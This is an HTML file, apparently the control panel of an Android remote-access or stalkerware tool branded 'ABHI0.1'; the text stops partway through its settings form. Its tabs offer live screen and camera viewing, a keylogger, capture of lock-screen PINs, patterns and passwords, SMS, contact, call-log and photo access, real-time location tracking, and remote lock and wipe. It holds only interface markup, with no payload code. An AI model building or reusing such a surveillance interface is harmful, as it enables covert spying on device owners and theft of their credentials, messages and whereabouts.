<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <meta name="theme-color" content="#020408">
    <meta name="description" content="ABHI0.1 Control Panel — Elite Cybersecurity Command Interface">
    <title>ABHI0.1 Control — Command Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20,400,0,0" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="stylesheet" href="/css/control-panel.css?v=5">
    <link rel="icon" type="image/png" href="/login/public/logo.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="ABHI0.1 Control">
</head>
<body>
    <!-- Animated Background Elements -->
    <div class="particle-field" id="particleField" aria-hidden="true"></div>
    <div class="circuit-traces" id="circuitTraces" aria-hidden="true"></div>
    <div class="scanlines" aria-hidden="true"></div>

    <!-- Top Navigation Bar -->
    <header class="cp-topbar" role="banner">
        <div class="cp-brand">
            <div class="cp-brand-logo">
                <span class="cp-brand-dot" aria-hidden="true"></span>
                <span class="cp-brand-name">ABHI0.1</span>
            </div>
            <span class="cp-brand-badge">
                <span class="cp-brand-dot" aria-hidden="true"></span>
                <span>Control Center</span>
                <span class="cp-brand-version">v3.7.1</span>
            </span>
        </div>

        <nav class="cp-nav" role="navigation" aria-label="Main Navigation">
            <button class="cp-nav-btn active" data-tab="devices" role="tab" aria-selected="true">
                <span class="icon material-symbols-outlined">devices</span>
                <span>Devices</span>
            </button>
            <button class="cp-nav-btn" data-tab="screen" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">screen_share</span>
                <span>Screen</span>
            </button>
            <button class="cp-nav-btn" data-tab="camera" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">videocam</span>
                <span>Camera</span>
            </button>
            <button class="cp-nav-btn" data-tab="lock" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">lock</span>
                <span>Lock</span>
            </button>
            <button class="cp-nav-btn" data-tab="apps" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">apps</span>
                <span>Apps</span>
            </button>
            <button class="cp-nav-btn" data-tab="files" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">folder</span>
                <span>Files</span>
            </button>
            <button class="cp-nav-btn" data-tab="logs" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">terminal</span>
                <span>Logs</span>
            </button>
            <button class="cp-nav-btn" data-tab="settings" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">settings</span>
                <span>Settings</span>
            </button>
        </nav>

        <div class="cp-actions">
            <div class="cp-user" tabindex="0" role="button" aria-label="User Menu" aria-expanded="false" aria-haspopup="true">
                <div class="cp-user-avatar">AD</div>
                <span class="cp-user-name">Admin</span>
            </div>
        </div>
    </header>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>

    <!-- Sidebar -->
    <aside class="cp-sidebar" id="sidebar" role="complementary" aria-label="Sidebar Navigation">
        <div class="cp-sidebar-header">
            <div class="cp-sidebar-title">Control Center</div>
            <div class="cp-brand-badge">
                <span class="cp-brand-dot" aria-hidden="true"></span>
                <span>v3.7.1</span>
            </div>
        </div>

        <nav class="cp-sidebar-nav" role="navigation" aria-label="Sidebar Navigation">
            <div class="cp-nav-section">Core</div>
            <button class="cp-nav-item active" data-tab="devices" role="tab" aria-selected="true">
                <span class="icon material-symbols-outlined">devices</span>
                <span>Devices</span>
            </button>
            <button class="cp-nav-item" data-tab="screen" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">screen_share</span>
                <span>Screen</span>
            </button>
            <button class="cp-nav-item" data-tab="camera" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">videocam</span>
                <span>Camera</span>
            </button>
            <button class="cp-nav-item" data-tab="lock" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">lock</span>
                <span>Lock</span>
            </button>

            <div class="cp-nav-section">Tools</div>
            <button class="cp-nav-item" data-tab="apps" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">apps</span>
                <span>Apps</span>
            </button>
            <button class="cp-nav-item" data-tab="files" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">folder</span>
                <span>Files</span>
            </button>
            <button class="cp-nav-item" data-tab="sms" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">sms</span>
                <span>SMS</span>
            </button>
            <button class="cp-nav-item" data-tab="contacts" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">contacts</span>
                <span>Contacts</span>
            </button>
            <button class="cp-nav-item" data-tab="calls" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">call</span>
                <span>Calls</span>
            </button>
            <button class="cp-nav-item" data-tab="location" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">gps_fixed</span>
                <span>Location</span>
            </button>
            <button class="cp-nav-item" data-tab="keylog" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">keyboard</span>
                <span>Keylog</span>
            </button>
            <button class="cp-nav-item" data-tab="camera" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">photo_camera</span>
                <span>Camera Roll</span>
            </button>
            <button class="cp-nav-item" data-tab="notifications" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">notifications</span>
                <span>Alerts</span>
            </button>

            <div class="cp-nav-section">System</div>
            <button class="cp-nav-item" data-tab="logs" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">terminal</span>
                <span>Logs</span>
            </button>
            <button class="cp-nav-item" data-tab="lock" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">fingerprint</span>
                <span>Lock Codes</span>
            </button>
            <button class="cp-nav-item" data-tab="permissions" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">security</span>
                <span>Permissions</span>
            </button>
            <button class="cp-nav-item" data-tab="settings" role="tab" aria-selected="false">
                <span class="icon material-symbols-outlined">settings</span>
                <span>Settings</span>
            </button>
        </nav>

        <div class="cp-sidebar-footer">
            ABHI0.1 Secure Access v3.7.1<br>
            Encrypted Channel • Zero Trust
        </div>
    </aside>

    <!-- Sidebar Backdrop for Mobile -->
    <div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>

    <!-- Main Content -->
    <main class="cp-main" role="main">
        <div class="cp-content" id="content">

            <!-- Devices Tab (Default) -->
            <section class="tab-view active" id="tab-devices" role="tabpanel" aria-labelledby="tab-devices">
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Devices</h1>
                        <p class="cp-page-subtitle">Connected Devices Management</p>
                    </div>
                    <div class="cp-page-actions">
                        <button class="cp-btn cp-btn-outline" id="refreshDevicesBtn">
                            <span class="icon material-symbols-outlined">refresh</span>
                            <span class="btn-text">Refresh</span>
                        </button>
                        <button class="cp-btn" id="addDeviceBtn">
                            <span class="icon material-symbols-outlined">add</span>
                            <span class="btn-text">Add Device</span>
                        </button>
                    </div>
                </header>

                <div class="cp-status-bar" role="status" aria-live="polite" aria-label="System Status">
                    <div class="cp-status-item">
                        <span class="cp-status-dot online" aria-hidden="true"></span>
                        <span class="cp-status-label">Core Online</span>
                    </div>
                    <div class="cp-status-item">
                        <span class="cp-status-dot cyan" aria-hidden="true"></span>
                        <span class="cp-status-label">Grid Active</span>
                    </div>
                    <div class="cp-status-item">
                        <span class="cp-status-dot purple" aria-hidden="true"></span>
                        <span class="cp-status-label">Shield Armed</span>
                    </div>
                </div>

                <div class="cp-quick-actions" role="group" aria-label="Quick Actions">
                    <button class="cp-qbtn" data-action="lock">
                        <span class="icon material-symbols-outlined">lock</span>
                        <span>Lock</span>
                    </button>
                    <button class="cp-qbtn" data-action="unlock">
                        <span class="icon material-symbols-outlined">lock_open</span>
                        <span>Unlock</span>
                    </button>
                    <button class="cp-qbtn" data-action="screenshot">
                        <span class="icon material-symbols-outlined">screenshot</span>
                        <span>Screenshot</span>
                    </button>
                    <button class="cp-qbtn" data-action="locate">
                        <span class="icon material-symbols-outlined">gps_fixed</span>
                        <span>Locate</span>
                    </button>
                    <button class="cp-qbtn" data-action="wipe">
                        <span class="icon material-symbols-outlined">delete_forever</span>
                        <span>Wipe</span>
                    </button>
                </div>

                <div class="devices-list" id="devicesList" role="list" aria-label="Connected Devices">
                    <div class="device-empty" id="devicesEmpty">
                        <span class="material-symbols-outlined">devices</span>
                        <p>No devices connected</p>
                        <button class="cp-btn cp-btn-outline" style="margin-top: var(--space-md);" id="addFirstDeviceBtn">
                            <span class="icon material-symbols-outlined">add</span>
                            <span>Add Device</span>
                        </button>
                    </div>
                </div>
            </section>

            <!-- Screen Tab -->
            <section class="tab-view" id="tab-screen" role="tabpanel" aria-labelledby="tab-screen" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Screen</h1>
                        <p class="cp-page-subtitle">Remote Screen Control & Monitoring</p>
                    </div>
                    <div class="cp-page-actions">
                        <button class="cp-btn" id="startStreamBtn">
                            <span class="icon material-symbols-outlined">play_circle</span>
                            <span class="btn-text">Start Stream</span>
                        </button>
                        <button class="cp-btn cp-btn-outline" id="screenshotBtn">
                            <span class="icon material-symbols-outlined">screenshot</span>
                            <span class="btn-text">Screenshot</span>
                        </button>
                    </div>
                </header>

                <div class="cp-panel">
                    <header class="cp-panel-header">
                        <h2 class="cp-panel-title">
                            <span class="icon material-symbols-outlined">screen_share</span>
                            <span>Live Screen</span>
                        </h2>
                        <div class="cp-panel-actions">
                            <div class="hw-quality-wrap">
                                <label class="hw-quality-lbl" for="hwQualitySel">Quality</label>
                                <select class="hw-quality-sel" id="hwQualitySel" aria-label="Stream Quality">
                                    <option value="720p">720p</option>
                                    <option value="480p" selected>480p</option>
                                    <option value="360p">360p</option>
                                    <option value="240p">240p</option>
                                </select>
                            </div>
                            <button class="cp-btn cp-btn-secondary" id="fullscreenBtn" aria-label="Fullscreen">
                                <span class="icon material-symbols-outlined">fullscreen</span>
                            </button>
                        </div>
                    </header>

                    <div class="hbnc-screen-area" id="screenArea" role="region" aria-label="Live Screen View">
                        <canvas id="hbcnCanvas" aria-hidden="true"></canvas>
                        <div class="hbnc-placeholder" id="hbcnPlaceholder" aria-hidden="true">
                            <span class="material-symbols-outlined">screen_share</span>
                            <p>Stream inactive</p>
                            <p class="input-viz-hint">Click Start Stream to begin</p>
                        </div>
                        <div class="hbnc-error" id="hbcnError" style="display:none;" role="alert">
                            <span class="material-symbols-outlined" style="font-size:32px;opacity:0.5">error</span>
                            <p id="hbcnErrorText">Connection error</p>
                            <button class="hbnc-retry-btn" onclick="startLiveScreen()">Retry</button>
                        </div>
                    </div>
                </div>

                <div class="cp-grid cp-grid-2" style="margin-top: var(--space-xl);">
                    <div class="cp-panel">
                        <header class="cp-panel-header">
                            <h3 class="cp-panel-title">
                                <span class="icon material-symbols-outlined">control_point</span>
                                <span>Navigation</span>
                            </h3>
                        </header>
                        <div class="cp-btn-group" role="group" aria-label="Navigation Controls">
                            <button class="cp-btn cp-btn-secondary" data-action="home" aria-label="Home">
                                <span class="icon material-symbols-outlined">home</span>
                                <span>Home</span>
                            </button>
                            <button class="cp-btn cp-btn-secondary" data-action="back" aria-label="Back">
                                <span class="icon material-symbols-outlined">arrow_back</span>
                                <span>Back</span>
                            </button>
                            <button class="cp-btn cp-btn-secondary" data-action="recent" aria-label="Recent Apps">
                                <span class="icon material-symbols-outlined">recent_actors</span>
                                <span>Recent</span>
                            </button>
                        </div>
                    </div>

                    <div class="cp-panel">
                        <header class="cp-panel-header">
                            <h3 class="cp-panel-title">
                                <span class="icon material-symbols-outlined">gesture</span>
                                <span>Gestures</span>
                            </h3>
                        </header>
                        <div class="cp-btn-group" role="group" aria-label="Gesture Controls">
                            <button class="cp-btn cp-btn-secondary" data-action="rotate" aria-label="Rotate Screen">
                                <span class="icon material-symbols-outlined">rotate_right</span>
                                <span>Rotate</span>
                            </button>
                            <button class="cp-btn cp-btn-secondary" data-action="volume-up" aria-label="Volume Up">
                                <span class="icon material-symbols-outlined">volume_up</span>
                                <span>Vol Up</span>
                            </button>
                            <button class="cp-btn cp-btn-secondary" data-action="volume-down" aria-label="Volume Down">
                                <span class="icon material-symbols-outlined">volume_down</span>
                                <span>Vol Down</span>
                            </button>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Camera Tab -->
            <section class="tab-view" id="tab-camera" role="tabpanel" aria-labelledby="tab-camera" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Camera</h1>
                        <p class="cp-page-subtitle">Camera Control & Live View</p>
                    </div>
                </header>

                <div class="cp-panel">
                    <header class="cp-panel-header">
                        <h2 class="cp-panel-title">
                            <span class="icon material-symbols-outlined">videocam</span>
                            <span>Live Camera</span>
                        </h2>
                        <div class="cp-panel-actions">
                            <button class="cp-btn" id="hwCamStartBtn" aria-label="Start Camera">
                                <span class="icon material-symbols-outlined">play_circle</span>
                                <span class="btn-text">Start</span>
                            </button>
                            <button class="cp-btn cp-btn-secondary" id="hwCamStopBtn" aria-label="Stop Camera" style="display:none;">
                                <span class="icon material-symbols-outlined">stop_circle</span>
                                <span class="btn-text">Stop</span>
                            </button>
                            <button class="cp-btn cp-btn-secondary" id="hwCamSnapBtn" aria-label="Capture Photo" style="display:none;">
                                <span class="icon material-symbols-outlined">camera</span>
                                <span class="btn-text">Capture</span>
                            </button>
                            <button class="cp-btn cp-btn-secondary" id="hwCamSwitchBtn" aria-label="Switch Camera" style="display:none;">
                                <span class="icon material-symbols-outlined">switch_camera</span>
                                <span class="btn-text">Switch</span>
                            </button>
                        </div>
                    </header>

                    <div id="hwCamViewport" style="aspect-ratio: 16/9; border-radius: var(--radius-lg); overflow: hidden; background: #000; position: relative;">
                        <img id="hwCamFrame" style="display:none; width:100%; height:100%; object-fit:cover;" alt="Camera Feed">
                        <div class="hbnc-placeholder" id="hwCamPlaceholder" style="display:flex; flex-direction:column; align-items:center; justify-content:center; gap:8px; color:var(--text3); font-size:13px; padding:32px; width:100%; height:100%;">
                            <span class="material-symbols-outlined" style="font-size:48px;opacity:0.3">videocam_off</span>
                            <p>Camera inactive</p>
                        </div>
                        <div class="hbnc-error" id="hwCamError" style="display:none;" role="alert">
                            <span class="material-symbols-outlined" style="font-size:32px;opacity:0.5">error</span>
                            <p id="hwCamErrorText">Camera error</p>
                            <button class="hbnc-retry-btn" onclick="hwCamStart()">Retry</button>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Lock / Unlock Tab -->
            <section class="tab-view" id="tab-lock" role="tabpanel" aria-labelledby="tab-lock" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Lock</h1>
                        <p class="cp-page-subtitle">Screen Lock & Unlock Control</p>
                    </div>
                </header>

                <div class="cp-grid cp-grid-2">
                    <div class="cp-panel">
                        <header class="cp-panel-header">
                            <h2 class="cp-panel-title">
                                <span class="icon material-symbols-outlined">lock</span>
                                <span>Screen Lock</span>
                            </h2>
                        </header>
                        <div class="cp-lock-panel" role="region" aria-label="Lock Controls">
                            <div class="cp-lock-visual">
                                <div class="lock-kind-badge lock-kind-pin">PIN</div>
                                <div class="cp-lock-code" id="lockCodeDisplay">••••</div>
                                <div class="cp-lock-actions">
                                    <button class="cp-btn" id="lockScreenBtn" aria-label="Lock Screen">
                                        <span class="icon material-symbols-outlined">lock</span>
                                        <span>Lock Screen</span>
                                    </button>
                                    <button class="cp-btn cp-btn-outline" id="unlockScreenBtn" aria-label="Unlock Screen">
                                        <span class="icon material-symbols-outlined">lock_open</span>
                                        <span>Unlock</span>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="cp-panel">
                        <header class="cp-panel-header">
                            <h2 class="cp-panel-title">
                                <span class="icon material-symbols-outlined">fingerprint</span>
                                <span>Lock Codes</span>
                            </h2>
                        </header>
                        <div class="cp-lock-panel" role="region" aria-label="Lock Codes">
                            <div class="cp-lock-visual">
                                <div class="lock-kind-badge lock-kind-pin">PIN</div>
                                <div class="cp-lock-code" id="capturedPinDisplay">1234</div>
                            </div>
                            <div class="cp-lock-actions">
                                <button class="cp-btn" id="capturePinBtn" aria-label="Capture PIN">
                                    <span class="icon material-symbols-outlined">fingerprint</span>
                                    <span>Capture PIN</span>
                                </button>
                                <button class="cp-btn cp-btn-outline" id="capturePatternBtn" aria-label="Capture Pattern">
                                    <span class="icon material-symbols-outlined">gesture</span>
                                    <span>Capture Pattern</span>
                                </button>
                                <button class="cp-btn cp-btn-outline" id="capturePasswordBtn" aria-label="Capture Password">
                                    <span class="icon material-symbols-outlined">password</span>
                                    <span>Capture Pass</span>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="cp-panel" style="grid-column: 1 / -1;">
                    <header class="cp-panel-header">
                        <h2 class="cp-panel-title">
                            <span class="icon material-symbols-outlined">lock_person</span>
                            <span>Unlock with Code</span>
                        </h2>
                    </header>
                    <div class="cp-lock-panel">
                        <div class="cp-lock-visual">
                            <div class="lock-kind-badge lock-kind-pin">PIN</div>
                            <div class="cp-lock-code" id="unlockCodeDisplay" style="letter-spacing: 0.5em;">••••</div>
                            <div class="cp-lock-actions">
                                <button class="cp-btn" id="verifyUnlockBtn" aria-label="Verify & Unlock">
                                    <span class="icon material-symbols-outlined">verified</span>
                                    <span>Verify & Unlock</span>
                                </button>
                                <button class="cp-btn cp-btn-outline" id="clearUnlockBtn" aria-label="Clear">
                                    <span class="icon material-symbols-outlined">backspace</span>
                                    <span>Clear</span>
                                </button>
                            </div>
                        </div>
                        <div class="cp-btn-group" role="group" aria-label="Keypad">
                            <button class="cp-btn cp-btn-secondary" data-pin="1" aria-label="1">1</button>
                            <button class="cp-btn cp-btn-secondary" data-pin="2" aria-label="2">2</button>
                            <button class="cp-btn cp-btn-secondary" data-pin="3" aria-label="3">3</button>
                            <button class="cp-btn cp-btn-secondary" data-pin="4" aria-label="4">4</button>
                            <button class="cp-btn cp-btn-secondary" data-pin="5" aria-label="5">5</button>
                            <button class="cp-btn cp-btn-secondary" data-pin="6" aria-label="6">6</button>
                            <button class="cp-btn cp-btn-secondary" data-pin="7" aria-label="7">7</button>
                            <button class="cp-btn cp-btn-secondary" data-pin="8" aria-label="8">8</button>
                            <button class="cp-btn cp-btn-secondary" data-pin="9" aria-label="9">9</button>
                            <button class="cp-btn cp-btn-secondary" aria-label="Clear" id="pinClearBtn">
                                <span class="icon material-symbols-outlined">backspace</span>
                            </button>
                            <button class="cp-btn cp-btn-secondary" data-pin="0" aria-label="0">0</button>
                            <button class="cp-btn cp-btn-outline" aria-label="Submit" id="pinSubmitBtn">
                                <span class="icon material-symbols-outlined">check</span>
                            </button>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Apps Tab -->
            <section class="tab-view" id="tab-apps" role="tabpanel" aria-labelledby="tab-apps" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Apps</h1>
                        <p class="cp-page-subtitle">Application Management</p>
                    </div>
                    <div class="cp-page-actions">
                        <button class="cp-btn cp-btn-outline" id="refreshAppsBtn">
                            <span class="icon material-symbols-outlined">refresh</span>
                            <span class="btn-text">Refresh</span>
                        </button>
                    </div>
                </header>

                <div class="apps-filter" role="group" aria-label="App Filters">
                    <button class="af-chip af-active" data-filter="all">All</button>
                    <button class="af-chip" data-filter="user">User</button>
                    <button class="af-chip" data-filter="system">System</button>
                    <button class="af-chip" data-filter="disabled">Disabled</button>
                </div>

                <div class="app-grid" id="appsGrid" role="list" aria-label="Installed Applications">
                    <div class="device-empty">
                        <span class="material-symbols-outlined">apps</span>
                        <p>Loading apps...</p>
                    </div>
                </div>
            </section>

            <!-- Files Tab -->
            <section class="tab-view" id="tab-files" role="tabpanel" aria-labelledby="tab-files" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Files</h1>
                        <p class="cp-page-subtitle">File Manager & Browser</p>
                    </div>
                    <div class="cp-page-actions">
                        <button class="cp-btn cp-btn-outline" id="refreshFilesBtn">
                            <span class="icon material-symbols-outlined">refresh</span>
                            <span class="btn-text">Refresh</span>
                        </button>
                        <button class="cp-btn" id="uploadFileBtn">
                            <span class="icon material-symbols-outlined">upload</span>
                            <span class="btn-text">Upload</span>
                        </button>
                    </div>
                </header>

                <div class="cp-panel">
                    <div class="file-path" id="filePath">/storage/emulated/0</div>
                    <div id="filesList" class="devices-list" role="list" aria-label="Files">
                        <div class="device-empty">
                            <span class="material-symbols-outlined">folder_open</span>
                            <p>Loading files...</p>
                        </div>
                    </div>
                </div>
            </section>

            <!-- SMS Tab -->
            <section class="tab-view" id="tab-sms" role="tabpanel" aria-labelledby="tab-sms" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">SMS</h1>
                        <p class="cp-page-subtitle">Message Management</p>
                    </div>
                    <div class="cp-page-actions">
                        <button class="cp-btn" id="sendSmsBtn">
                            <span class="icon material-symbols-outlined">send</span>
                            <span class="btn-text">New Message</span>
                        </button>
                    </div>
                </header>

                <div class="cp-panel">
                    <div id="smsThreads" class="devices-list" role="list" aria-label="SMS Threads">
                        <div class="device-empty">
                            <span class="material-symbols-outlined">sms</span>
                            <p>Loading messages...</p>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Contacts Tab -->
            <section class="tab-view" id="tab-contacts" role="tabpanel" aria-labelledby="tab-contacts" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Contacts</h1>
                        <p class="cp-page-subtitle">Contact Management</p>
                    </div>
                    <div class="cp-page-actions">
                        <button class="cp-btn" id="addContactBtn">
                            <span class="icon material-symbols-outlined">person_add</span>
                            <span class="btn-text">Add Contact</span>
                        </button>
                    </div>
                </header>

                <div class="cp-panel">
                    <div id="contactsList" class="devices-list" role="list" aria-label="Contacts">
                        <div class="device-empty">
                            <span class="material-symbols-outlined">contacts</span>
                            <p>Loading contacts...</p>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Calls Tab -->
            <section class="tab-view" id="tab-calls" role="tabpanel" aria-labelledby="tab-calls" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Calls</h1>
                        <p class="cp-page-subtitle">Call Log Management</p>
                    </div>
                </header>

                <div class="cp-panel">
                    <div id="callsList" class="devices-list" role="list" aria-label="Call Log">
                        <div class="device-empty">
                            <span class="material-symbols-outlined">call</span>
                            <p>Loading calls...</p>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Location Tab -->
            <section class="tab-view" id="tab-location" role="tabpanel" aria-labelledby="tab-location" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Location</h1>
                        <p class="cp-page-subtitle">Device Location & Tracking</p>
                    </div>
                    <div class="cp-page-actions">
                        <button class="cp-btn" id="refreshLocationBtn">
                            <span class="icon material-symbols-outlined">refresh</span>
                            <span class="btn-text">Refresh</span>
                        </button>
                    </div>
                </header>

                <div class="cp-panel">
                    <div class="loc-hero" id="locHero">
                        <div class="loc-head">
                            <div>
                                <h2 class="loc-title">Device Location</h2>
                                <p class="loc-sub">Real-time device tracking and geofencing</p>
                            </div>
                            <div class="loc-actions">
                                <button class="cp-btn" id="refreshLocBtn">
                                    <span class="icon material-symbols-outlined">refresh</span>
                                    <span class="btn-text">Refresh</span>
                                </button>
                            </div>
                        </div>
                        <div class="loc-grid" id="locGrid">
                            <div class="loc-tile">
                                <div class="loc-tile-k">Latitude</div>
                                <div class="loc-tile-v" id="locLat">—</div>
                            </div>
                            <div class="loc-tile">
                                <div class="loc-tile-k">Longitude</div>
                                <div class="loc-tile-v" id="locLng">—</div>
                            </div>
                            <div class="loc-tile">
                                <div class="loc-tile-k">Accuracy</div>
                                <div class="loc-tile-v" id="locAcc">—</div>
                            </div>
                            <div class="loc-tile">
                                <div class="loc-tile-k">Altitude</div>
                                <div class="loc-tile-v" id="locAlt">—</div>
                            </div>
                            <div class="loc-tile">
                                <div class="loc-tile-k">Speed</div>
                                <div class="loc-tile-v" id="locSpd">—</div>
                            </div>
                            <div class="loc-tile">
                                <div class="loc-tile-k">Bearing</div>
                                <div class="loc-tile-v" id="locBrg">—</div>
                            </div>
                            <div class="loc-tile">
                                <div class="loc-tile-k">Provider</div>
                                <div class="loc-tile-v" id="locPrv">—</div>
                            </div>
                            <div class="loc-tile">
                                <div class="loc-tile-k">Updated</div>
                                <div class="loc-tile-v" id="locTime">—</div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Keylog Tab -->
            <section class="tab-view" id="tab-keylog" role="tabpanel" aria-labelledby="tab-keylog" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Keylogger</h1>
                        <p class="cp-page-subtitle">Keystroke Monitoring</p>
                    </div>
                </header>

                <div class="cp-panel">
                    <div class="kl-stats" role="group" aria-label="Keylog Statistics">
                        <div class="kl-stat">
                            <div class="kl-stat-val" id="klTotal">0</div>
                            <div class="kl-stat-lbl">Total Keys</div>
                        </div>
                        <div class="kl-stat">
                            <div class="kl-stat-val" id="klToday">0</div>
                            <div class="kl-stat-lbl">Today</div>
                        </div>
                        <div class="kl-stat">
                            <div class="kl-stat-val" id="klApps">0</div>
                            <div class="kl-stat-lbl">Apps</div>
                        </div>
                    </div>

                    <div class="kl-entries" id="klEntries" role="list" aria-label="Keystroke Entries">
                        <div class="device-empty">
                            <span class="material-symbols-outlined">keyboard</span>
                            <p>Loading keylog...</p>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Camera Roll Tab -->
            <section class="tab-view" id="tab-camera" role="tabpanel" aria-labelledby="tab-camera" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Camera Roll</h1>
                        <p class="cp-page-subtitle">Photos & Videos</p>
                    </div>
                </header>

                <div class="cp-panel">
                    <div id="cameraRollGrid" class="cp-grid cp-grid-4" role="list" aria-label="Camera Roll">
                        <div class="device-empty" style="grid-column: 1 / -1;">
                            <span class="material-symbols-outlined">photo_library</span>
                            <p>Loading media...</p>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Notifications Tab -->
            <section class="tab-view" id="tab-notifications" role="tabpanel" aria-labelledby="tab-notifications" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Alerts</h1>
                        <p class="cp-page-subtitle">System Notifications & Alerts</p>
                    </div>
                </header>

                <div class="cp-panel">
                    <div id="notificationsList" class="devices-list" role="list" aria-label="Notifications">
                        <div class="device-empty">
                            <span class="material-symbols-outlined">notifications</span>
                            <p>No alerts</p>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Logs Tab -->
            <section class="tab-view" id="tab-logs" role="tabpanel" aria-labelledby="tab-logs" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Logs</h1>
                        <p class="cp-page-subtitle">System & Activity Logs</p>
                    </div>
                    <div class="cp-page-actions">
                        <button class="cp-btn cp-btn-outline" id="refreshLogsBtn">
                            <span class="icon material-symbols-outlined">refresh</span>
                            <span class="btn-text">Refresh</span>
                        </button>
                        <button class="cp-btn cp-btn-outline" id="clearLogsBtn">
                            <span class="icon material-symbols-outlined">delete_sweep</span>
                            <span class="btn-text">Clear</span>
                        </button>
                    </div>
                </header>

                <div class="cp-panel">
                    <div id="logsList" class="devices-list" role="list" aria-label="System Logs">
                        <div class="device-empty">
                            <span class="material-symbols-outlined">terminal</span>
                            <p>Loading logs...</p>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Settings Tab -->
            <section class="tab-view" id="tab-settings" role="tabpanel" aria-labelledby="tab-settings" hidden>
                <header class="cp-page-header">
                    <div class="cp-page-title-group">
                        <h1 class="cp-page-title">Settings</h1>
                        <p class="cp-page-subtitle">System Configuration</p>
                    </div>
                </header>

                <div class="cp-grid cp-grid-2">
                    <div class="cp-panel">
                        <header class="cp-panel-header">
                            <h2 class="cp-panel-title">
                                <span class="icon material-symbols-outlined">security</span>
                                <span>Security</span>
                            </h2>
                        </header>
                        <div class="options-form">
                            <div class="opt-row">
                                <span class="opt-label">Auto Lock Timeout</span>
                                <select class="cp-input" id="autoLockTimeout">
                                    <option value="30">30 seconds</option>
                                    <option value="60" selected>1 minute</option>
                                    <option value="300">5 minutes</option>
                                    <option value="600">10 minutes</option>
                                </select>
                            </div>
                            <div class="opt-row">
                                <span class="opt-label">Failed Attempts Lockout</span>
                                <select class="cp-input" id="failedAttemptsLockout">
                                    <option value="3">3 attempts</option>
                                    <option value="5" selected>5 attempts</option>
                                    <option value="10">10 attempts</option>
                                </select>
                            </div>
                            <div class="opt-row">
                                <span class="opt-label">Lockout Duration</span>
                                <select class="cp-input" id="lockoutDuration">
                                    <option value="60">1 minute</option>
                                    <option value="300" selected>5 minutes</option>
                                    <option value="900">15 minutes</option>
                                    <option value="3600">1 hour</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    <div class="cp-panel">
                        <header class="cp-panel-header">
                            <h2 class="cp-panel-title">
                                <span class="icon material-symbols-outlined">notifications</span>
                                <span>Notifications</span>
                            </h2>
                        </header>
                        <div class="options-form">
                            <div class="opt-row">
                                <span class="opt-label">Push Notifications</span>
